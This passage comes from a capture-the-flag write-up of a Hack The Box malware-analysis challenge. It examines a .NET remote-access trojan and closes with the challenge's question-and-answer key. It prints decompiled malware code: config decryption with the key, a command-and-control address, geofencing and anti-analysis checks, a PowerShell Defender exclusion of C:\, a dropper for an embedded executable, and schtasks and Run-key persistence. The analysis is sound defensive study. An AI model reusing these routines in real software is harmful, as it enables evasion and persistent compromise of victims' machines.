1z2vJHb2yeN3l2C9OpQR7NIVRjRsT/ZOD28MdiUjNt6TF+g6HL3SgL0gRmMVLnr0EgOSG6/CKTLXbSw5vPiA/jZFDIodDimSpWySSqSDzsLzIlKdFH8F07ctIiLwemNBUGbENr2pRl/6S4sTmrcyL61kQZ9IBj9k6o7S/Ij1jpzK/LAQDpoVB/pe4WX3RV04lXuDdsXfy287yJp79+5K4E8InWKMF+pPWsPZ74lK/JLONUd3l44XYOUYuRRqHNAqhgvrr4zO0rzC390evX1tiYHlhSN565pvwp/fR+kKIhOB4eFHlT0d1a8I8e2C7mXvmb7nASwrheUaCFfv1OQBC26lOkr9Pk/1rUq3Qr3m4YFCghnOwogtfH9oX7Q+PYcDDW5m6jAetZBuJ/7k7ONcY3FTdRq99FRtbEt2615fioGXmPla0Db/0uRqAnBddF3cqUxHrvFzrWS1Z6zWesbe4RKZsDTE6on0pF4bAiSY95wtEnzsPXWnXOaRN1QDxr6qD6A3mIKEy/FPhV6aKiD6lrMhKJrVhXPyUAHfrz0XKB7mSDcMV6ApDuilGeY5twp1Gas5yaaf7IKsEcsAI5YykOdd7dmG9eGudCBoVpz6BuC66MFnnqYgSx/ZR8U5JVdPxYzu4TjatZ8jSaFyZSd8V2Ozn4G9hpUE9NEHpTqs52JCWBueDVOo2YVzd0gx/tdEX+sqHptVr3CN83iEILzHaiTeueKl997BSM91DWvmreCPbSVfa0lDzmmCdFPso7JMVCsSvPg==";
    public static string Serversignature = "/bRqUeXBdZCuxgI/2/7rWxgpiy8KtTaO3Y9jE0UIB7jPor+zHjk4096eAkTAqvoBCmSKpOdf6LhBLA0LQp6QaMjLyarBb9Nsb1htoNI3FmxQxmTMJy2L2QhnxN9bSyEokiekpZduLGz0tMRoR6ptBu9Fg9lDzvF+m+hN1PO0OT55kiEapBYQ5Y+FeDA/AmVa1OfKiAtPtEMpDHnUdHeNOPuEua/OJBQ1XkIX+VqBCA2tmOg5d3EFL5bdGZsQqo8CyfdpBXAZZO+tPxXVVT7ne22WEi1yLSLTGsZc1enRx7CNex02e9d5ylONGhBV5Ag0dr0/drCfecd/sj7DmsHwjO0AgZSB5gPafFV7+lF1P1c31q0GA6B11ubZ22zRG9RZ0tfu3s+LovoFRXLqqq7NxjGFQgarm2LlD6LjoPIxvYtdpJx44xH3WErbQ9e7TuR3rGbp9tn1kYkd5enFWjgaWNgt2Tmnt+GS70f6GFCCeKpkjQit0VLr2FCp4KzXt+PqiHd4wEoO2mcp5Kd9lpMF1N7blreB6LL0CzlcqNKvHb8HuvAppX1OWm5V/nSVC7QqLmVd+RTh6KMy8dUiC6DXWxLGlad248fYk+fB4Hv91Dd5UhHuNUJtmo9mga8lqiEPLNjxkRZ0628PQD82UW0aNON3KdIEjFj5/5Bae8g+UIfzT1tMJA38r57ji6AK9vI4QRPMDc3TF2AI3KXF5kpmpwaySTi7s3GPQ4p7QOiRmhIPAhYQ+VLDhDTsOFlxYpbB2NjNMXsuRX26P+x4dB8muQ5wSfCs2Xj2jhGFCt5/eVNdcwiEoVv4zBNmf8AtNn1oOowa2QiDXJti240SRlFkz9NhUitatw9Iy1Q3+mAtTF8bDEc4aIMjdkPzMJ1V/wgjGfqq+MVE/uKFIFwIFRsYpwLFBAKO22Ss5iyXxlZQtwaHk7YGMF9aizDNW6xYfsc6tgiOIPgPPIeCKzOdkBHf9g==";
    public static X509Certificate2 ServerCertificate;
    public static string Anti = "fCwlflXMAdogW4D4fIj3moC+wFLtjo6mp9KHe1MVrDMuaM5ZoUXHgv2lRfa7YM5+rvFxmj9tDHw+sVXaRY1zlg==";
    public static string Dis = "eHnjJEp2ZkLj6MSs+13iZQH+NpVvQzAWt2JRWvyL0PWcHdXN+MHnGg9tPhcSuD9K3+t+ar4P1RaQskGL8V+CRQ==";
    public static Aes256 aes256;
    public static string Pastebin = "ykky6EoelNEC8vPoUnizcEL991/9Z4JtTdXcrbUDO0p0z9H8/iYcjz8mFV9MLssX1DZaGrTjVrxMC+ujgNzbvA==";
    public static string BDOS = "nBWIp+KaiegAWV9+1LzFXfN4WQJFrwfeIrenaI7vCegXyhXeJlbDtNtF88ywBYaS31QSfQ+oKf2EWpsVLHN3Aw==";
    public static string Hwid = (string) null;
    public static string Delay = "3";
    public static string Group = "1Rqjrd4tIw4x02NJDtCWYAPP3wCjYTxB2EN1xAHJIIh9VfCf+agEtHh2SmZY3xd0HQm833sW5sY+EihxLts2kw==";

    public static bool InitializeSettings()
    {
      try
      {
        Settings.Key = Encoding.UTF8.GetString(Convert.FromBase64String(Settings.Key));
        Settings.aes256 = new Aes256(Settings.Key);
        Settings.Ports = Settings.aes256.Decrypt(Settings.Ports);
        Settings.Hosts = Settings.aes256.Decrypt(Settings.Hosts);
        Settings.Version = Settings.aes256.Decrypt(Settings.Version);
        Settings.Install = Settings.aes256.Decrypt(Settings.Install);
        Settings.Exclusion = Settings.aes256.Decrypt(Settings.Exclusion);
        Settings.AntiSNG = Settings.aes256.Decrypt(Settings.AntiSNG);
        Settings.MTX = Settings.aes256.Decrypt(Settings.MTX);
        Settings.Pastebin = Settings.aes256.Decrypt(Settings.Pastebin);
        Settings.Anti = Settings.aes256.Decrypt(Settings.Anti);
        Settings.Dis = Settings.aes256.Decrypt(Settings.Dis);
        Settings.BDOS = Settings.aes256.Decrypt(Settings.BDOS);
        Settings.Group = Settings.aes256.Decrypt(Settings.Group);
        Settings.Hwid = HwidGen.HWID();
        Settings.Serversignature = Settings.aes256.Decrypt(Settings.Serversignature);
        Settings.ServerCertificate = new X509Certificate2(Convert.FromBase64String(Settings.aes256.Decrypt(Settings.Certificate)));
        return Settings.VerifyHash();
      }
      catch
      {
        return false;
      }
    }

```

#### Dynamic Decryption

I want these values to understand what the malware is going to do. There’s two ways to go about this. The easier way is to open it in [DNSpy](https://github.com/dnSpy/dnSpy) and place break points just after the decryption. When I step over the decryption, the return value is shown in the Locals Window:

![image-20240502081152957](/img/image-20240502081152957.png)

#### Static Decryption

Rather than debug, I can understand the algorithm. On first look, I assumed this was a C# AES library, and that I would just throw these values into CyberChef and get the result. It turns out it’s a bit more complex. There’s some really cool CyberChef foo using registers to decrypt this, which I’ll show in [this video](https://www.youtube.com/watch?v=_InXFxdGRg8):

To summarize, the `AES` object is from `Client.Algorithm`. It defines the algorithm constants:

```

    private const int KeyLength = 32;
    private const int AuthKeyLength = 64;
    private const int IvLength = 16;
    private const int HmacSha256Length = 32;
    private readonly byte[] _key;
    private readonly byte[] _authKey;
    private static readonly byte[] Salt = new byte[32]
    {
      (byte) 191, (byte) 235, (byte) 30, (byte) 251, (byte) 205, (byte) 151, (byte) 59, (byte) 178, (byte) 25, (byte) 2, (byte) 36, (byte) 48, (byte) 165, (byte) 120, (byte) 67, (byte) 0, (byte) 61, (byte) 86, (byte) 68, (byte) 210, (byte) 30, (byte) 98, (byte) 185, (byte) 212, (byte) 241, (byte) 128, (byte) 231, (byte) 230, (byte) 195, (byte) 57, (byte) 65
    };

```

The key is generated using RFC2898 PBKDF2:

```

    public Aes256(string masterKey)
    {
      if (string.IsNullOrEmpty(masterKey))
        throw new ArgumentException("masterKey can not be null or empty.");
      using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(masterKey, Aes256.Salt, 50000))
      {
        this._key = rfc2898DeriveBytes.GetBytes(32);
        this._authKey = rfc2898DeriveBytes.GetBytes(64);
      }
    }

```

The decryption is done using AES CBC and PKCS7 padding:

```

    public byte[] Decrypt(byte[] input)
    {
      if (input == null)
        throw new ArgumentNullException("input can not be null.");
      using (MemoryStream memoryStream = new MemoryStream(input))
      {
        using (AesCryptoServiceProvider cryptoServiceProvider = new AesCryptoServiceProvider())
        {
          cryptoServiceProvider.KeySize = 256;
          cryptoServiceProvider.BlockSize = 128;
          cryptoServiceProvider.Mode = CipherMode.CBC;
          cryptoServiceProvider.Padding = PaddingMode.PKCS7;
          cryptoServiceProvider.Key = this._key;
          using (HMACSHA256 hmacshA256 = new HMACSHA256(this._authKey))
          {
            byte[] hash = hmacshA256.ComputeHash(memoryStream.ToArray(), 32, memoryStream.ToArray().Length - 32);
            byte[] numArray = new byte[32];
            memoryStream.Read(numArray, 0, numArray.Length);
            if (!this.AreEqual(hash, numArray))
              throw new CryptographicException("Invalid message authentication code (MAC).");
          }
          byte[] buffer = new byte[16];
          memoryStream.Read(buffer, 0, 16);
          cryptoServiceProvider.IV = buffer;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, cryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Read))
          {
            byte[] numArray = new byte[memoryStream.Length - 16L + 1L];
            byte[] dst = new byte[cryptoStream.Read(numArray, 0, numArray.Length)];
            Buffer.BlockCopy((Array) numArray, 0, (Array) dst, 0, dst.Length);
            return dst;
          }
        }
      }
    }

```

Putting that all into CyberChef (as shown in the video) makes [this recipe](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)To_Hex('None',0)Regular_expression('User%20defined','%5E.%7B64%7D(.*)',true,true,false,false,false,false,'List%20capture%20groups')Register('%5E(.%7B32%7D)',true,false,false)Register('%5E.%7B32%7D(.*)',true,false,false)Derive_PBKDF2_key(%7B'option':'Base64','string':'d0cyOFJwZlBBSXBnalhEVFd2bEdiVHRkQnpybnRBeVM%3D'%7D,256,50000,'SHA1',%7B'option':'Hex','string':'bfeb1e56fbcd973bb219022430a57843003d5644d21e62b9d4f180e7e6c33941'%7D)Register('(%5B%5C%5Cs%5C%5CS%5D*)',true,false,false)Find_/_Replace(%7B'option':'Regex','string':'%5E.*$'%7D,'$R1',true,false,true,false)AES_Decrypt(%7B'option':'Hex','string':'$R2'%7D,%7B'option':'Hex','string':'$R0'%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D,%7B'option':'Hex','string':''%7D)&input=K1BibzV4Wk1yaGpKSHgzSGhkWUpIa2RoK3EycHlnMXlZWmw5N2IwMjJqdlNWekhqcitvZS8zdlZidFV2RENvREFzVytqTUJMYnRLQmZmV3E4eDI3REZURFYzRUs5UkpuZDNTWTZPQkQ4R289) that decrypts the values:

![image-20240502142117466](/img/image-20240502142117466.png)

#### Settings Values

Either way to get there, the values for the settings are:

| Name | Value |
| --- | --- |
| Ports | “666,777,111,5544” (Task 14) |
| Hosts | “127.0.0.1,194.37.80.5” |
| Version | “Empire 0.1” |
| Install | “false” |
| Exclusion | “false” |
| AntiSNG | “false” |
| MTX | “false” |
| Pastebin | “test” |
| Anti | “null” |
| Dis | “false” |
| BDOS | “false” |
| Group | “Default” |
| Serversignature | “InD75WopDY0Gy6DdOUrP…[snip]…” |
| ServerCertificate | “MIIE5jCCAs6gAwIBAgIQAM…[snip]…” |

### Antisng

After getting the settings, the thread may call `Antisng.GetSNG` from the `Client.Helper` namespace:

```

    public static void GetSNG()
    {
      string countryCode = Antisng.GetCountryCode();
      string countryName = Antisng.GetCountryName();
      if (!(countryCode == "RU") && !(countryCode == "AZ") && !(countryCode == "AM") && !(countryCode == "BY") && !(countryCode == "KZ") && !(countryCode == "KG") && !(countryCode == "MD") && !(countryCode == "TJ") && !(countryCode == "TM") && !(countryCode == "UZ") && !(countryName == "Russia"))
        return;
      Environment.Exit(0);
    }

```

It gets the country code and name, and then exists if the cost if one from the list of if the name is Russia (Task 16).

`GetCountryCode` and `GetCountryName` are very similar, both making calls to `http://ip-api.com/json/` (Task 15) to get information. For example:

```

    public static string GetCountryCode()
    {
      string requestUriString = "http://ip-api.com/json/";
      string input = string.Empty;
      try
      {
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(requestUriString);
        httpWebRequest.Method = "GET";
        httpWebRequest.ContentType = "application/json";
        using (HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse())
        {
          using (StreamReader streamReader = new StreamReader(response.GetResponseStream()))
            input = streamReader.ReadToEnd();
        }
        JavaScriptSerializer scriptSerializer = new JavaScriptSerializer();
        scriptSerializer.RegisterConverters((IEnumerable<JavaScriptConverter>) new Antisng.CountryConverter[1]
        {
          new Antisng.CountryConverter()
        });
        object obj1 = scriptSerializer.Deserialize<object>(input);
        // ISSUE: reference to a compiler-generated field
        if (Antisng.\u003C\u003Eo__2.\u003C\u003Ep__1 == null)
        {
          // ISSUE: reference to a compiler-generated field
          Antisng.\u003C\u003Eo__2.\u003C\u003Ep__1 = CallSite<Func<CallSite, object, string>>.Create(Binder.Convert(CSharpBinderFlags.None, typeof (string), typeof (Antisng)));
        }
        // ISSUE: reference to a compiler-generated field
        Func<CallSite, object, string> target = Antisng.\u003C\u003Eo__2.\u003C\u003Ep__1.Target;
        // ISSUE: reference to a compiler-generated field
        CallSite<Func<CallSite, object, string>> p1 = Antisng.\u003C\u003Eo__2.\u003C\u003Ep__1;
        // ISSUE: reference to a compiler-generated field
        if (Antisng.\u003C\u003Eo__2.\u003C\u003Ep__0 == null)
        {
          // ISSUE: reference to a compiler-generated field
          Antisng.\u003C\u003Eo__2.\u003C\u003Ep__0 = CallSite<Func<CallSite, object, string, object>>.Create(Binder.GetIndex(CSharpBinderFlags.None, typeof (Antisng), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[2]
          {
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.Constant, (string) null)
          }));
        }
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        object obj2 = Antisng.\u003C\u003Eo__2.\u003C\u003Ep__0.Target((CallSite) Antisng.\u003C\u003Eo__2.\u003C\u003Ep__0, obj1, "countryCode");
        return target((CallSite) p1, obj2);
      }
      catch
      {
      }
      return "Unknown code";
    }

```

### Anti\_Analysis

The next call could be (if configured) to `Anti_Analysis.RunAntiAnalysis` in the `Client.Helper` namespace:

```

    public static void RunAntiAnalysis()
    {
      if (!Anti_Analysis.DetectManufacturer() && !Anti_Analysis.DetectDebugger() && !Anti_Analysis.DetectSandboxie() && !Anti_Analysis.IsSmallDisk() && !Anti_Analysis.IsXP() && !Anti_Analysis.IsProcessRunning("dnSpy") && !Anti_Analysis.CheckWMI())
        return;
      Environment.FailFast((string) null);
    }

```

This calls a bunch of functions, and if any returns True, calls `Environment.FailFast`. It performs the following checks:
- The `Win32-ComputerSystem` value from WMI and checking for Microsoft, VMWare, or VirtualBox.
- The native method `isDebuggerPresent`.
- If `SbieDll.dll` if loaded, a [Sandboxie](https://sandboxie-plus.com/) DLL.
- If the disk is less than 61,000,000,000 bytes.
- If the OS is Windows XP.
- If `dnSpy` is in the process list (Task 17).
- If the manufacturer of the computer is in a list of virtualization or Linux vendors.

### Methods

The `Methods.go` function is called if configured:

```

    public static void go()
    {
      try
      {
        string str = Regex.Replace(Regex.Match(Assembly.GetExecutingAssembly().Location, "[^\\\\]+$").Value, ".exe$", "");
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software");
        if (subKey.OpenSubKey(str, true) == null)
        {
          subKey.CreateSubKey(str);
          Methods.create();
          Methods.writeb();
          Environment.Exit(0);
        }
        else
        {
          if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + str))
            return;
          File.Create(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + str);
          Process.Start(new ProcessStartInfo()
          {
            FileName = "powershell",
            Arguments = "-Command \"Add-MpPreference -ExclusionPath 'C:\\'",
            Verb = "runas"
          });
        }
      }
      catch
      {
      }
    }

```

It creates a registry key in `HKCU:\\Software\AppleService` and sets the `Path` value to the current binary’s location. It also, in the `writeb` function, takes a list of 6000+ ints and writes that to `AppData` as a random five characters dot exe:

```

    public static void writeb()
    {
      byte[] buffer = new byte[6656]
      {
        (byte) 77,
        (byte) 90,
        ...[snip]...
      };
      string str = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\" + Methods.Gen(5) + ".exe";
      using (FileStream fileStream = new FileStream(str, FileMode.Create))
        fileStream.Write(buffer, 0, buffer.Length);
      Process.Start(str);
    }

```

I can save out this binary, and could take a look at it, though I won’t get to it for this post.

### NormalStartup

The `Client.Install` namespace has a `NormalStartup` class, with an `Install` function:

![image-20240502093041430](/img/image-20240502093041430.png)

In this function, if the process is running as admin, it uses Scheduled Tasks to get persistence with a run level of “highest” (Task 19):

```

        if (Methods.IsAdmin())
        {
          Process.Start(new ProcessStartInfo()
          {
            FileName = "cmd",
            Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" + Path.GetFileNameWithoutExtension(path1) + "\" /tr \"" + path1 + "\" & exit",
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true
          });
        }

```

Otherwise, it tries to write a registry key:

```

        else
        {
          using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Strings.StrReverse("\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree))
            registryKey?.SetValue(Path.GetFileNameWithoutExtension(path1), (object) ("\"" + path1 + "\""));
        }

```

That key is `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\` (Task 18), a class [run key](https://attack.mitre.org/techniques/T1547/001/) that specifies software that the user will run on startup.

## Question Answers
1. The victim visited a web page.The HTML file of the web page has been provided as ‘downloader.html’ sample file. The web page downloads a ZIP file named ‘Invitation\_Farewell\_DE\_EMB.zip’. What is the SHA-256 hash of the ZIP file?

   5d4bf026fad40979541efd2419ec0b042c8cf83bc1a61cbcc069efe0069ccd27
2. Thedownloaded ZIP file contains a HTA file, which creates multiple files. One of those files is a signed fileby Microsoft Corporation. In HTA file, which variable’s value was the content of that signed file?

   `msoev`
3. The threat actor was acting as an embassy of a country. Which country was that?

   Germany
4. The malware communicated with a chatting platform domain. What is the domainname (inclusive of sub doamain) the malware connects to?

   `toyy.zulipchat.com`
5. How many DNS A records were found for that domain?

   6
6. It seems like the chatting service was running on a very known cloud service using a FQDN, where the FQDN contains the IP address of the chatting domain in reversive format somehow. What is the FQDN?

   `ec2-35-171-197-55.compute-1.amazonaws.com`
7. What was the parent PID (PPID) of the malware?

   4156
8. What was the computer name of the victim computer?

   DESKTOP-O88AN4O
9. What was the username of the victim computer?

   TWF
10. How many times were the Windows Registry keys set with a data value?

    11
11. Did the malicious mso.dll load by the malware executable successfully?

    yes
12. The JavaScript file tries to write itself as a .bat file. What is the .bat file name (name+extension) it tries to write itself as?

    `richpear.bat`
13. The JavaScript file contains a big text which is encoded as Base64. If you decode that Base64 text and write its content as an EXE file. What will be the SHA256 hash of the EXE?

    db84db8c5d76f6001d5503e8e4b16cdd3446d5535c45bbb0fca76cfec40f37cc
14. The malware contains a class Client.Settings which sets different configurations. It has a variable ‘Ports’ where the value is Base64 encoded. The value is decrypted using Aes256.Decrypt. After decryption, what will be its value (the decrypted value will be inside double quotation)?

    666,777,111,5544
15. The malware sends a HTTP request to a URI and checks the country code or country name of the victim machine. To which URI does the malware sends request for this?

    http://ip-api.com/json/
16. After getting the country code or country name of the victim machine, the malware checks some country codes and a country name. In case of the country name, if the name is matched with the victim machine’s country name, the malware terminates itself. What is the country name it checks with the victim system?

    Russia
17. As an anti-debugging functionality, the malware checks if there is any process running where the process name is a debugger. What is the debugger name it tries to check if that’s running?

    dnSpy
18. For persistence, the malware writes a Registry key where the registry key is hardcoded in the malware in reversed format. What is the registry key after reversing?

    `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\`
19. The malware sets a scheduled task. What is the Run Level for the scheduled task/job it sets?

    highest

[Einladen mso.dll RE »](/2024/05/09/htb-sherlock-einladen-malware-re.html)